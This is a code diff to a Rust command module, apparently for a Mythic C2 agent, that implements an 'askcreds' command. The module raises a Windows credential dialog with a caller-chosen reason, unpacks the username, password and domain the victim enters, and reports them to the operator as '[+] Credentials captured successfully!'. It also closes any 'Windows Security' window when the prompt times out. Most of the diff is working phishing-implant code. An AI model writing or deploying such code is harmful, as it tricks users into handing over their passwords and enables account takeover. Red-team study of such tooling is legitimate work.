@@ -24,7 +24,21 @@ use winapi::um::memoryapi::*;
 #[cfg(target_os = "windows")]
 use winapi::um::errhandlingapi::*;
 #[cfg(target_os = "windows")]
-use winapi::shared::minwindef::{FALSE, TRUE, BOOL, ULONG};
+use winapi::um::combaseapi::CoTaskMemFree;
+#[cfg(target_os = "windows")]
+use winapi::shared::windef::HWND;
+#[cfg(target_os = "windows")]
+use winapi::shared::minwindef::{FALSE, TRUE, BOOL, ULONG, LPARAM, WPARAM, DWORD, LPVOID};
+#[cfg(target_os = "windows")]
+use winapi::shared::winerror::{
+    ERROR_SUCCESS, ERROR_CANCELLED, ERROR_INSUFFICIENT_BUFFER, WAIT_TIMEOUT,
+};
+#[cfg(target_os = "windows")]
+use winapi::um::winnt::{HEAP_ZERO_MEMORY, PROCESS_QUERY_INFORMATION};
+#[cfg(target_os = "windows")]
+use winapi::um::winbase::{
+    QueryFullProcessImageNameW, GetUserNameW, GetProcessHeap, HeapAlloc, HeapFree, WAIT_OBJECT_0,
+};
 
 #[cfg(target_os = "windows")]
 const TIMEOUT: u32 = 60;
@@ -62,7 +76,7 @@ unsafe extern "system" fn enum_windows_proc(hwnd: HWND, _lparam: LPARAM) -> BOOL
     }
 
     ptr::write_bytes(window_title.as_mut_ptr(), 0, window_title.len());
-    
+
     if SendMessageA(
         hwnd,
         WM_GETTEXT,
@@ -74,15 +88,17 @@ unsafe extern "system" fn enum_windows_proc(hwnd: HWND, _lparam: LPARAM) -> BOOL
     }
 
     let title_str = std::ffi::CStr::from_ptr(window_title.as_ptr()).to_string_lossy();
-    
+
     if title_str.eq_ignore_ascii_case("Windows Security") {
         PostMessageA(hwnd, WM_CLOSE, 0, 0);
-    } else if proc_id == GetCurrentProcessId() && (style & WS_POPUPWINDOW) == WS_POPUPWINDOW {
+    } else if proc_id == GetCurrentProcessId()
+        && ((style as u32 & WS_POPUPWINDOW) == WS_POPUPWINDOW)
+    {
         PostMessageA(hwnd, WM_CLOSE, 0, 0);
     } else {
         let mut file_name = [0u16; 260]; // MAX_PATH
         let mut size = 260 as DWORD;
-        
+
         let h_process = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, proc_id);
         if !h_process.is_null() && h_process != INVALID_HANDLE_VALUE {
             if QueryFullProcessImageNameW(h_process, 0, file_name.as_mut_ptr(), &mut size) != 0 {
@@ -130,7 +146,7 @@ unsafe fn ask_creds(reason: &str) -> Result<CredentialResult, String> {
     // Get current username and pack credentials
     if GetUserNameW(username.as_mut_ptr(), &mut username_len) != 0 {
         let empty_password = string_to_wide("");
-        
+
         if CredPackAuthenticationBufferW(
             CRED_PACK_GENERIC_CREDENTIALS,
             username.as_mut_ptr(),
@@ -164,8 +180,9 @@ unsafe fn ask_creds(reason: &str) -> Result<CredentialResult, String> {
         cred_ui_info.hwndParent = hwnd;
     }
 
+    // FIX: make mutable pointer for C API
     let result = CredUIPromptForWindowsCredentialsW(
-        &cred_ui_info,
+        &mut cred_ui_info,
         0,
         &mut auth_package,
         in_cred_buffer,
@@ -204,22 +221,25 @@ unsafe fn ask_creds(reason: &str) -> Result<CredentialResult, String> {
             &mut password_len,
         ) != 0
         {
-            let username_str = String::from_utf16_lossy(
-                &unpacked_username[..username_len as usize]
-            ).trim_end_matches('\0').to_string();
-            
-            let password_str = String::from_utf16_lossy(
-                &unpacked_password[..password_len as usize]
-            ).trim_end_matches('\0').to_string();
-            
-            let domain_str = String::from_utf16_lossy(
-                &unpacked_domain[..domain_len as usize]
-            ).trim_end_matches('\0').to_string();
+            let username_str =
+                String::from_utf16_lossy(&unpacked_username[..username_len as usize])
+                    .trim_end_matches('\0')
+                    .to_string();
+
+            let password_str =
+                String::from_utf16_lossy(&unpacked_password[..password_len as usize])
+                    .trim_end_matches('\0')
+                    .to_string();
+
+            let domain_str =
+                String::from_utf16_lossy(&unpacked_domain[..domain_len as usize])
+                    .trim_end_matches('\0')
+                    .to_string();
 
             credential_result.success = true;
             credential_result.username = Some(username_str);
             credential_result.password = Some(password_str);
-            
+
             if !domain_str.is_empty() {
                 credential_result.domain = Some(domain_str);
             }
@@ -232,14 +252,17 @@ unsafe fn ask_creds(reason: &str) -> Result<CredentialResult, String> {
     } else if result == ERROR_CANCELLED {
         credential_result.error = Some("The operation was canceled by the user".to_string());
     } else {
-        credential_result.error = Some(format!("CredUIPromptForWindowsCredentialsW failed with error: {}", result));
+        credential_result.error = Some(format!(
+            "CredUIPromptForWindowsCredentialsW failed with error: {}",
+            result
+        ));
     }
 
     // Cleanup
     if !in_cred_buffer.is_null() {
         HeapFree(GetProcessHeap(), 0, in_cred_buffer);
     }
-    
+
     if !out_cred_buffer.is_null() {
         CoTaskMemFree(out_cred_buffer as *mut _);
     }
@@ -247,7 +270,9 @@ unsafe fn ask_creds(reason: &str) -> Result<CredentialResult, String> {
     if credential_result.success {
         Ok(credential_result)
     } else {
-        Err(credential_result.error.unwrap_or_else(|| "Unknown error".to_string()))
+        Err(credential_result
+            .error
+            .unwrap_or_else(|| "Unknown error".to_string()))
     }
 }
 
@@ -260,85 +285,81 @@ unsafe extern "system" fn thread_proc(param: *mut c_void) -> DWORD {
     } else {
         DEFAULT_REASON.to_string()
     };
-    
-    // We'll use a channel to communicate the result back
-    // For now, we'll just execute and the result will be handled elsewhere
+
     let _ = ask_creds(&reason);
     0
 }
 
-// Main command execution function for Mythic
 #[cfg(target_os = "windows")]
 pub fn ask_credentials(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
-    // Parse arguments from task parameters
     let args: AskCredsArgs = if task.parameters.is_empty() {
         AskCredsArgs { reason: None }
     } else {
         serde_json::from_str(&task.parameters)?
     };
-    
+
     let reason = args.reason.unwrap_or_else(|| DEFAULT_REASON.to_string());
-    
+
     let result = unsafe {
-        // Create a thread for the credential prompt
         let reason_cstring = std::ffi::CString::new(reason.as_str())
             .map_err(|e| format!("Failed to create CString: {}", e))?;
-        
         let reason_ptr = reason_cstring.into_raw();
-        
+
         let handle = CreateThread(
             ptr::null_mut(),
             0,
-            Some(std::mem::transmute(thread_proc as unsafe extern "system" fn(*mut c_void) -> DWORD)),
+            Some(std::mem::transmute(
+                thread_proc as unsafe extern "system" fn(*mut c_void) -> DWORD,
+            )),
             reason_ptr as *mut c_void,
             0,
             ptr::null_mut(),
         );
 
         if handle.is_null() {
-            // Clean up the CString if thread creation fails
             let _ = std::ffi::CString::from_raw(reason_ptr);
             return Ok(mythic_error!(task.id, "Failed to create thread for credential prompt"));
         }
 
         let wait_result = WaitForSingleObject(handle, TIMEOUT * 1000);
-        
+
         let credential_result = if wait_result == WAIT_TIMEOUT {
-            // Timeout - close credential windows
             if EnumWindows(Some(enum_windows_proc), 0) == 0 {
-                // If closing windows failed, terminate thread
                 TerminateThread(handle, 0);
             }
-            
-            // Wait for thread cleanup
             WaitForSingleObject(handle, 2000);
             Ok(mythic_error!(task.id, "Credential prompt timed out"))
         } else {
-            // Thread completed, now actually get the credentials
             match ask_creds(&reason) {
                 Ok(creds) => {
                     if creds.success {
-                        let mut output = format!("[+] Credentials captured successfully!\n[+] Username: {}", 
-                            creds.username.unwrap_or_default());
-                        
+                        let mut output = format!(
+                            "[+] Credentials captured successfully!\n[+] Username: {}",
+                            creds.username.unwrap_or_default()
+                        );
+
                         if let Some(domain) = creds.domain {
                             output.push_str(&format!("\n[+] Domain: {}", domain));
                         }
-                        
+
                         if let Some(password) = creds.password {
                             output.push_str(&format!("\n[+] Password: {}", password));
                         }
-                        
+
                         Ok(mythic_success!(task.id, output))
                     } else {
-                        Ok(mythic_error!(task.id, creds.error.unwrap_or_else(|| "Failed to capture credentials".to_string())))
+                        Ok(mythic_error!(
+                            task.id,
+                            creds
+                                .error
+                                .unwrap_or_else(|| "Failed to capture credentials".to_string())
+                        ))
                     }
                 }
-                Err(e) => Ok(mythic_error!(task.id, e))
+                Err(e) => Ok(mythic_error!(task.id, e)),
             }
         };
 
-        // Clean up
         CloseHandle(handle);
         let _ = std::ffi::CString::from_raw(reason_ptr);
 
@@ -348,16 +369,20 @@ pub fn ask_credentials(task: &AgentTask) -> Result<serde_json::Value, Box<dyn st
     result
 }
 
-// macOS placeholder implementation
 #[cfg(target_os = "macos")]
 pub fn ask_credentials(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
-    Ok(mythic_error!(task.id, "askcreds command is not implemented for macOS"))
+    Ok(mythic_error!(
+        task.id,
+        "askcreds command is not implemented for macOS"
+    ))
 }
 
-// Fallback for other platforms
 #[cfg(not(any(target_os = "windows", target_os = "macos")))]
 pub fn ask_credentials(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
-    Ok(mythic_error!(task.id, "askcreds command is only supported on Windows"))
+    Ok(mythic_error!(
+        task.id,
+        "askcreds command is only supported on Windows"
+    ))
 }
 
 #[cfg(test)]
@@ -366,9 +391,11 @@ mod tests {
 
     #[test]
     fn test_askcreds_args_parsing() {
-        let args = AskCredsArgs { reason: Some("Test Reason".to_string()) };
+        let args = AskCredsArgs {
+            reason: Some("Test Reason".to_string()),
+        };
         assert_eq!(args.reason.unwrap(), "Test Reason");
-        
+
         let default_args = AskCredsArgs { reason: None };
         assert!(default_args.reason.is_none());
     }
